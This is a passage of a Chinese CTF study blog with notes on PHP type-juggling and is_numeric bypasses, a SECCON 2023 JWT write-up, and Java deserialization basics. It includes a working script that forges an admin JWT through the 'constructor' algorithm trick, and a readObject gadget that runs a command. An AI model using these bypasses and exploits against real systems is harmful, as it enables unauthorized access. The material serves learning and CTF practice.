class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-variable">$c</span>=is_numeric(<span class="hljs-variable">$a</span>) <span class="hljs-keyword">and</span> is_numeric(<span class="hljs-variable">$b</span>);<br>var_dump(is_numeric(<span class="hljs-variable">$a</span>));<br>var_dump(is_numeric(<span class="hljs-variable">$b</span>)); <br>var_dump(<span class="hljs-variable">$c</span>); <span class="hljs-regexp">//</span><span class="hljs-variable">$b</span>可以不是数字，同样返回<span class="hljs-literal">true</span><br><span class="hljs-variable">$test</span>=<span class="hljs-literal">false</span> <span class="hljs-keyword">and</span> <span class="hljs-literal">true</span>;<br>var_dump(<span class="hljs-variable">$test</span>); <span class="hljs-regexp">//</span>返回<span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><h4 id="NULL-0-”0″-array-使用-和false比较时，都是会返回true的"><a href="#NULL-0-”0″-array-使用-和false比较时，都是会返回true的" class="headerlink" title="NULL,0,”0″,array()使用==和false比较时，都是会返回true的"></a>NULL,0,”0″,array()使用==和false比较时，都是会返回true的</h4><h4 id="eregi匹配"><a href="#eregi匹配" class="headerlink" title="eregi匹配"></a>eregi匹配</h4><p>ereg()有区分大小写，eregi()与大小写无关<br>使用指定的模式搜索一个字符串中指定的字符串，如果匹配成功则返回true，否则返回false</p><h5 id="1-数组绕过"><a href="#1-数组绕过" class="headerlink" title="1.数组绕过"></a>1.数组绕过</h5><p>ereg是处理字符串，传入数组之后，ereg是返回NULL</p><h5 id="2-00截断绕过"><a href="#2-00截断绕过" class="headerlink" title="2.%00截断绕过"></a>2.%00截断绕过</h5><p>读到%00截止</p><h4 id="接收参数-a得存在，并且-a-0可用-绕过（非数字都可绕过）"><a href="#接收参数-a得存在，并且-a-0可用-绕过（非数字都可绕过）" class="headerlink" title="接收参数$a得存在，并且$a==0可用.绕过（非数字都可绕过）"></a>接收参数$a得存在，并且$a==0可用.绕过（非数字都可绕过）</h4><p>如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span>==<span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;1&quot;</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;must&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="is-numeric绕过"><a href="#is-numeric绕过" class="headerlink" title="is_numeric绕过"></a>is_numeric绕过</h4><p>用于检测变量是否为数字或数字字符串，可被十六进制的值进行绕过<br>空格、\t、\n、\r、\v、\f、+、-能够出现在参数开头，“点”能够在参数任何位置，E、e只能出现在参数中间。</p><h4 id="php5-3-29-这里可以直接用-0b绕过-s（空白字符）的匹配"><a href="#php5-3-29-这里可以直接用-0b绕过-s（空白字符）的匹配" class="headerlink" title="php5,3,29,这里可以直接用%0b绕过\s（空白字符）的匹配"></a>php5,3,29,这里可以直接用%0b绕过\s（空白字符）的匹配</h4><h4 id="既是0又是1的情况"><a href="#既是0又是1的情况" class="headerlink" title="既是0又是1的情况"></a>既是0又是1的情况</h4><p><code>$a==1&amp;$test[$a]=t</code>时；<br>php精度（16以上）<code>var_dump(9999999999999999999==1);//true</code><br>科学计数法 <code>.1e1 echo $b[‘.1e1’]//输出t</code><br>.是字符串所以在数组里面变成0，但在is_numeric中有点则正常输出为数字</p><h4 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h4><h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><h4 id="当switch没有break时可以继续往下执行"><a href="#当switch没有break时可以继续往下执行" class="headerlink" title="当switch没有break时可以继续往下执行"></a>当switch没有break时可以继续往下执行</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> ( <span class="hljs-variable">$_GET</span> [<span class="hljs-string">&#x27;which&#x27;</span>] )) &#123;<br> <span class="hljs-variable">$which</span> = <span class="hljs-variable">$_GET</span> [<span class="hljs-string">&#x27;which&#x27;</span>];<br> <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$which</span>) &#123;<br> <span class="hljs-keyword">case</span> <span class="hljs-number">0</span> :<br> <span class="hljs-keyword">case</span> <span class="hljs-number">1</span> :<br> <span class="hljs-keyword">case</span> <span class="hljs-number">2</span> :<br> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$which</span> . <span class="hljs-string">&#x27;.php&#x27;</span>;<br> <span class="hljs-keyword">break</span>;<br> <span class="hljs-keyword">default</span> :<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;1&quot;</span>;<br> <span class="hljs-keyword">break</span>;<br> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>$which</code>进入循环时没有break则按顺序继续往下执行</p><h4 id="PHP-RCE：滥用对象创建"><a href="#PHP-RCE：滥用对象创建" class="headerlink" title="PHP-RCE：滥用对象创建"></a>PHP-RCE：滥用对象创建</h4><p><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-rce-abusing-object-creation-new-usd_get-a-usd_get-b">https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-rce-abusing-object-creation-new-usd_get-a-usd_get-b</a><br>某天晚上土豆提到了<br><a href="http://39.108.86.101:10001/">http://39.108.86.101:10001/</a><br>这个需要内置类</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2023/09/19：CSAW2023</title>
    <link href="/2023/09/19/CSAW2023/"/>
    <url>/2023/09/19/CSAW2023/</url>
    
    <content type="html"><![CDATA[<h2 id="Smug-Dino"><a href="#Smug-Dino" class="headerlink" title="Smug-Dino"></a>Smug-Dino</h2><p>进入网页，选择Hint，提示要输入服务器的版本<br>随便发个包查看返回包，服务器为nginx1.17.6<br>此时出现两个提示：<br>提示一：进入flag页面会被重定向<br>提示二：CVE-2019…<br>经过百度，得：<br><a href="https://www.cnblogs.com/null1433/p/12778026.html">https://www.cnblogs.com/null1433/p/12778026.html</a><br>该漏洞为请求走私漏洞<br>注意请求包格式</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2023/09/18：SECCON2023</title>
    <link href="/2023/09/18/seccon2023/"/>
    <url>/2023/09/18/seccon2023/</url>
    
    <content type="html"><![CDATA[<h2 id="Bad-JWT"><a href="#Bad-JWT" class="headerlink" title="Bad-JWT"></a>Bad-JWT</h2><p>原型链污染<br><a href="https://github.com/xryuseix/CTF_Writeups/tree/master/SECCON2023">https://github.com/xryuseix/CTF_Writeups/tree/master/SECCON2023</a></p><h3 id="原型与原型链"><a href="#原型与原型链" class="headerlink" title="原型与原型链"></a>原型与原型链</h3><p><a href="https://juejin.cn/post/6984678359275929637">https://juejin.cn/post/6984678359275929637</a></p><h4 id="构造函数与原型"><a href="#构造函数与原型" class="headerlink" title="构造函数与原型"></a>构造函数与原型</h4><p>JS中没有类（Class）这个概念，所以JS的设计者使用了构造函数来实现继承机制，通过此生成实例。但是，在构造函数中通过this赋值的属性或者方法，是每个实例的实例属性以及实例方法，无法共享公共属性。此时需要原型对象来储存构造函数的公共属性和方法</p><h4 id="原型对象"><a href="#原型对象" class="headerlink" title="原型对象"></a>原型对象</h4><p>JS的每个函数在创建的时候，都会生成一个属性prototype，这个属性指向一个对象，这个对象就是此函数的原型对象。该原型对象中有个属性为constructor，指向该函数。这样原型对象和它的函数之间就产生了联系。</p><h4 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h4><img src="/2023/09/18/seccon2023/yuanx.png" class=""><p>每个通过构造函数创建出来的实例对象，其本身有个属性__proto__9各大厂商具体实现时添加的私有属性），这个属性会指向该实例对象的构造函数的原型对象<br>当访问一个对象的某个属性时，会先在这个对象本身属性上查找，如果没有找到，则会通过它的__proto__隐式属性，找到它的构造函数的原型对象，如果还没有找到就会再在其构造函数的prototype的__proto__中查找，这样一层一层向上查找就会形成一个链式结构，称为原型链<br>如果通过某个实例对象的__proto__属性赋值，则会改变其构造函数的原型对象，从而被所有实例所共享。</p><h4 id="原型链的尽头"><a href="#原型链的尽头" class="headerlink" title="原型链的尽头"></a>原型链的尽头</h4><p>所有的原型对象的__proto__属性都是指向function Object的原型对象。 而function Object的原型对象在上图中我们可以得知是不存在__proto__这个属性的，它指向了null<br>对于函数，它的__proto__属性指向了一个function Function的原型对象，该原型对象为JS中所有函数的原型对象，而其__proto__属性也还是指向了function Object的原型对象</p><img src="/2023/09/18/seccon2023/zhong.png" class=""><h3 id="题目复现"><a href="#题目复现" class="headerlink" title="题目复现"></a>题目复现</h3><p>太不智能了还要手写脚本发JWT（）<br>查看原代码，需要以admin身份登录，会对jwt检验<br>大致思路：<br>看看dockerfile-&gt;node.js<br>session.isadmin-&gt;app.listen-&gt;sign<br>index找flag-&gt;session.isadmin-&gt;app.use-&gt;jwt.verify-&gt;(jwt.js)verify<br>verify:parseToken/createSignature/… -&gt;signature-&gt;algorithms[…]-&gt;<br>const algorithms<br>index.js：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">app.<span class="hljs-keyword">listen</span>(PORT, () =&gt; &#123;<br>const admin_session = jwt.sign(<span class="hljs-string">&#x27;HS512&#x27;</span>, &#123; isAdmin: <span class="hljs-keyword">true</span> &#125;, secret);<br>console.log(`[<span class="hljs-keyword">INFO</span>] Use $&#123;admin_session&#125; <span class="hljs-keyword">as</span> <span class="hljs-keyword">session</span> cookie`);<br>  console.log(`Challenge <span class="hljs-keyword">server</span> listening <span class="hljs-keyword">on</span> port $&#123;PORT&#125;`);<br>&#125;);<br></code></pre></td></tr></table></figure><p>以此判断需要<code>&#123; isAdmin: true &#125;</code><br>关键点如下：<br>jwt.js</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">const</span> algorithms = &#123;<br>hs256: (<span class="hljs-class"><span class="hljs-keyword">data</span>, secret) =&gt; </span><br>base64UrlEncode(crypto.createHmac(&#x27;sha256&#x27;, secret).update(<span class="hljs-class"><span class="hljs-keyword">data</span>).digest()),</span><br>hs512: (<span class="hljs-class"><span class="hljs-keyword">data</span>, secret) =&gt; </span><br>base64UrlEncode(crypto.createHmac(&#x27;sha512&#x27;, secret).update(<span class="hljs-class"><span class="hljs-keyword">data</span>).digest()),</span><br>&#125;<br>...<br><span class="hljs-title">const</span> createSignature = (header, payload, secret) =&gt; &#123;<br>  const <span class="hljs-class"><span class="hljs-keyword">data</span> = `$&#123;<span class="hljs-title">stringifyPart</span>(<span class="hljs-title">header</span>)&#125;.$&#123;<span class="hljs-title">stringifyPart</span>(<span class="hljs-title">payload</span>)&#125;`;</span><br>  const signature = algorithms[header.alg.toLowerCase()](<span class="hljs-class"><span class="hljs-keyword">data</span>, secret);</span><br>  return signature;<br>&#125;;<br></code></pre></td></tr></table></figure><p>使用node命令进入REPL（终端类似物）可进行调试</p><img src="/2023/09/18/seccon2023/%E8%AE%B2%E8%A7%A31.png" class=""><img src="/2023/09/18/seccon2023/ceng.png" class=""><p>（蹭个图）<br>存在一个constructor属性（见原型链），这个属性调用之后回直接返回一个Function，实际上就是这个具体对象的构造函数，然后对其调用，实际上只会返回第一个参数（原理上就是获得了原型，然后进行了初始化，返回对象）<br>接下来就是verify函数中的<code>Buffer.from</code>和<code>Buffer.compare</code>（验证签名signature）</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-keyword">const</span> verify = (token, secret) =&gt; &#123;<br><span class="hljs-keyword">const</span> &#123; header, payload, signature: expected_signature &#125; = parseToken(token);<br><br><span class="hljs-keyword">const</span> calculated_signature = createSignature(header, payload, secret);<br><br><span class="hljs-keyword">const</span> calculated_buf = Buffer.<span class="hljs-keyword">from</span>(calculated_signature, <span class="hljs-string">&#x27;base64&#x27;</span>);<br><span class="hljs-keyword">const</span> expected_buf = Buffer.<span class="hljs-keyword">from</span>(expected_signature, <span class="hljs-string">&#x27;base64&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (Buffer.compare(calculated_buf, expected_buf) !== <span class="hljs-number">0</span>) &#123;<br><span class="hljs-keyword">throw</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&#x27;Invalid signature&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">return</span> payload;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Buffer.from(txt, &quot;base64&quot;)</code>不用作 base64的字符被忽略，不会解析不是base64的字符串<br><code>Buffer.compare</code>字符串和字符串对象是相同<br><code>&#123;headerBase64&#125;.&#123;bodyBase64&#125;</code>可以得到<code>eyJ0eXAiOiAiSldUIiwgImFsZyI6ICJjb25zdHJ1Y3RvciJ9.eyJpc0FkbWluIjogdHJ1ZX0</code>，用<code>eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9eyJpc0FkbWluIjp0cnVlfQ</code>作为签名，结果如下：</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs tap">expected_signature: &#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9eyJpc0FkbWluIjp0cnVlfQ&#x27;,<br>  calculated_signature: [String: &#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9.eyJpc0FkbWluIjp0cnVlfQ&#x27;],<br>  calculated_buf: &lt;Buffer 7b<span class="hljs-number"> 22 </span>74<span class="hljs-number"> 79 </span>70<span class="hljs-number"> 22 </span>3a<span class="hljs-number"> 22 </span>4a<span class="hljs-number"> 57 </span>54<span class="hljs-number"> 22 </span>2c<span class="hljs-number"> 22 </span>61 6c<span class="hljs-number"> 67 </span>22 3a<span class="hljs-number"> 22 </span>63 6f 6e<span class="hljs-number"> 73 </span>74<span class="hljs-number"> 72 </span>75<span class="hljs-number"> 63 </span>74 6f<span class="hljs-number"> 72 </span>22 7d 7b<span class="hljs-number"> 22 </span>69<span class="hljs-number"> 73 </span>41<span class="hljs-number"> 64 </span>6d<span class="hljs-number"> 69 </span>6e<span class="hljs-number"> 22 </span>3a<span class="hljs-number"> 74 </span>72<span class="hljs-number"> 75 </span>65 7d&gt;,<br>  expected_buf: &lt;Buffer 7b<span class="hljs-number"> 22 </span>74<span class="hljs-number"> 79 </span>70<span class="hljs-number"> 22 </span>3a<span class="hljs-number"> 22 </span>4a<span class="hljs-number"> 57 </span>54<span class="hljs-number"> 22 </span>2c<span class="hljs-number"> 22 </span>61 6c<span class="hljs-number"> 67 </span>22 3a<span class="hljs-number"> 22 </span>63 6f 6e<span class="hljs-number"> 73 </span>74<span class="hljs-number"> 72 </span>75<span class="hljs-number"> 63 </span>74 6f<span class="hljs-number"> 72 </span>22 7d 7b<span class="hljs-number"> 22 </span>69<span class="hljs-number"> 73 </span>41<span class="hljs-number"> 64 </span>6d<span class="hljs-number"> 69 </span>6e<span class="hljs-number"> 22 </span>3a<span class="hljs-number"> 74 </span>72<span class="hljs-number"> 75 </span>65 7d&gt;<br></code></pre></td></tr></table></figure><p>签名肯定是不同的，但是<code>buffer.from</code>移除了句点，<code>buffer.compare</code>的结果等于0，绕过了签名的验证<br>大佬exp</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> <span class="hljs-type">json</span><br><br><br><span class="hljs-keyword">header</span> = &#123;&quot;typ&quot;: &quot;JWT&quot;, &quot;alg&quot;: &quot;constructor&quot;&#125;<br>headerStr = <span class="hljs-type">json</span>.dumps(<span class="hljs-keyword">header</span>).encode(&quot;utf-8&quot;)<br>body = &#123;&quot;isAdmin&quot;: <span class="hljs-keyword">True</span>&#125;<br>bodyStr = <span class="hljs-type">json</span>.dumps(body).encode(&quot;utf-8&quot;)<br><br>def base64_encode(str: str):<br>    <span class="hljs-keyword">return</span> (<br>        base64.b64encode(str).replace(b&quot;=&quot;, b&quot;&quot;).replace(b&quot;+&quot;, b&quot;-&quot;).replace(b&quot;/&quot;, b&quot;_&quot;)<br>    )<br><br><br>headerBase64 = str(base64_encode(headerStr))[<span class="hljs-number">2</span>:<span class="hljs-number">-1</span>]<br>bodyBase64 = str(base64_encode(bodyStr))[<span class="hljs-number">2</span>:<span class="hljs-number">-1</span>]<br><br>jwt = f&quot;&#123;headerBase64&#125;.&#123;bodyBase64&#125;.eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9eyJpc0FkbWluIjp0cnVlfQ&quot;<br>print(jwt)<br>res = requests.<span class="hljs-keyword">get</span>(&quot;http://localhost:3000/&quot;, cookies=&#123;&quot;session&quot;: jwt&#125;)<br><br>print(res.text)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2023/9/17：Moectf2023</title>
    <link href="/2023/09/15/moectf2023/"/>
    <url>/2023/09/15/moectf2023/</url>
    
    <content type="html"><![CDATA[<p>沙箱逃逸<br><a href="https://zhuanlan.zhihu.com/p/578966149">https://zhuanlan.zhihu.com/p/578966149</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2023/09/14：java反序列化入门记录</title>
    <link href="/2023/09/14/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2023/09/14/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/mocas_wang/article/details/107621010">https://blog.csdn.net/mocas_wang/article/details/107621010</a><br>相关工具：ysoserial</p><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>序列化：将java对象转换为字节序列，在两个Java进程进行通信时实现进程间对象传送<br>常见序列化与反序列化协议：XML&amp;SOAP JSON Protobuf</p><h3 id="序列化实现"><a href="#序列化实现" class="headerlink" title="序列化实现"></a>序列化实现</h3><p>这里是原生的<br>只有实现了Serializable或者Externalizable接口的类的对象才能被序列化为字节序列<br>Serializable接口是一个空接口，Java提供的序列化接口<br><code>writeObject</code>序列化<br><code>readObject</code>反序列化：安全问题自动调用<br>可将以上两个方法重写实现自己需求</p><h3 id="Serializable-接口的特点"><a href="#Serializable-接口的特点" class="headerlink" title="Serializable 接口的特点"></a>Serializable 接口的特点</h3><p><code>transient</code>标识的对象成员变量不参与序列化，静态成员变量是不能被序列化，一个实现 Serializable 接口的子类也是可以被序列化的，序列化类的属性没有实现 Serializable 那么在序列化就会报错，在反序列化过程中，它的父类如果没有实现序列化接口，那么将需要提供无参构造函数来重新创建对象，Serializable 在序列化和反序列化过程中大量使用了反射，因此其过程会产生的大量的内存碎片</p><h3 id="入口类source"><a href="#入口类source" class="headerlink" title="入口类source"></a>入口类source</h3><h4 id="可能的形式"><a href="#可能的形式" class="headerlink" title="可能的形式"></a>可能的形式</h4><p>1.入口类readObject直接调用危险方法（例：传一个类，在里面重写readObject加个命令执行，把这个类序列化，反序列化时会执行命令执行的代码）<br>2.入口类参数中包含可控类，该类有危险方法readObject临时调用<br>3.入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject临时调用（套娃）<br>4.构造函数/静态代码块等类加载时隐式执行（较底层）</p><h4 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h4><p>最好选择JDK内置类，通用的框架或包（传一个东西，服务器上有相同的，可序列化）<br>入口类重写readObject，调用常见函数，参数类型广泛（最好Object，也可以是接口实现类多或别的啥），如Map（HashMap HashTable啥的）</p><h3 id="调用链gadget-chain"><a href="#调用链gadget-chain" class="headerlink" title="调用链gadget chain"></a>调用链gadget chain</h3><p>找利用链：某些重写Object自带方法，有潜在危险函数，类可反序列化，该类可能出现在利用链上<br>相同名称（同名函数调用，相当于替换） 相同类型（继承父类或相同接口） 不停调用<br>例：URLDNS<br>存在反序列化点-&gt;传进去-&gt;服务器发起DNS请求-&gt;收到请求，验证漏洞，类似盲SSRF<br>调用HashCode方法</p><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs qml">HashMap&lt;URL,Interger&gt; hashmap = <span class="hljs-keyword">new</span> HashMap();<br><span class="hljs-comment">//这里不要发起请求，把url对象的hashcode改成不是-1</span><br>URL <span class="hljs-built_in">url</span> = <span class="hljs-keyword">new</span> URL(<span class="hljs-string">&quot;http://...&quot;</span>);<br>Class c = <span class="hljs-built_in">url</span>.getClass();<br>Field hashcodefield = c.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>hashcodefield.setAccessible(<span class="hljs-literal">true</span>);<br>hashcodefield.set(<span class="hljs-built_in">url</span>,<span class="hljs-number">1234</span>);<br>hashmap.put(<span class="hljs-built_in">url</span>,<span class="hljs-number">1</span>); <br><span class="hljs-comment">//这里把hashcode改回-1，利用反射，同上</span><br>hashcodefield.set(<span class="hljs-built_in">url</span>,<span class="hljs-number">-1</span>);<br>serialize(hashmap);<br><span class="hljs-comment">//核心：新建对象，放到hashmap，序列化</span><br><span class="hljs-comment">//URL的readObject无可利用点</span><br><span class="hljs-comment">//入口A，接受参数O；目标类B，调用方法f，传递：A.readObject-&gt;B.f</span><br></code></pre></td></tr></table></figure><h3 id="执行类sink"><a href="#执行类sink" class="headerlink" title="执行类sink"></a>执行类sink</h3><p>实现rce ssrf balabala…</p><h3 id="反序列化漏洞应用"><a href="#反序列化漏洞应用" class="headerlink" title="反序列化漏洞应用"></a>反序列化漏洞应用</h3><p>1.定制需要的对象<br>2.通过invoke调用除了同名函数以外的函数<br>3.通过Class类（可以被序列化）创建对象，引入不能序列化的类（如Runtime，可命令执行）</p><h2 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h2><img src="/2023/09/14/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/fanshe.png" class=""><img src="/2023/09/14/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/fanshe1.png" class=""><img src="/2023/09/14/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/fanshe2.png" class=""><p>通过反射创建对象：</p><img src="/2023/09/14/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/fanshe3.png" class=""><p>原文件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">private</span> String name;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(<span class="hljs-type">int</span> age, String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;age=&quot;</span> + age +<br>                <span class="hljs-string">&quot;, name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">(String name)</span>&#123;<br>        System.out.println(name);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        ois.defaultReadObject();<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>反射：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 